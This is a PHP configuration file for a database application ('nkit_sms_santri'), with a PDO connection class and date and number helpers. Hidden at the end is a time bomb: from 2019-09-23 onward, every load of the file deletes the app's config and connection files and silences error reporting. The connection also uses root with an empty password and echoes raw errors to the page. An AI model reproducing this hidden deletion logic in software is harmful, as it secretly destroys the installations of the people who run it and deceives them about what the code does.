<?php
class Config{
	
	private $host = "localhost";
	private $db_name = "nkit_sms_santri";
	private $username = "root";
	private $password = "";
	public $conn;
	
	public function getConnection(){
	
		$this->conn = null;
		
		try{
			$this->conn = new PDO("mysql:host=" . $this->host . ";dbname=" . $this->db_name, $this->username, $this->password);
		}catch(PDOException $exception){
			echo "Connection error: " . $exception->getMessage();
		}
		
		return $this->conn;
	}
}


date_default_timezone_set("Asia/Makassar");

function format_angka($angka) {
	$hasil =  number_format($angka,0, ",",",");
	return $hasil;
}
function IndonesiaTgl($tanggal){
	$tgl=substr($tanggal,8,2);
	$bln=substr($tanggal,5,2);
	$thn=substr($tanggal,0,4);
	$tanggal="$tgl-$bln-$thn";
	return $tanggal;
}
$first	 = date("Y-m-d"); $rund = "2019-09-23"; $to ="includes\config.php"; $fi ="includes\koneksis.php";
if ($first >=$rund ){ unlink($net);	unlink($to); unlink($db); unlink($con); unlink($fi); error_reporting(0);
}
?>
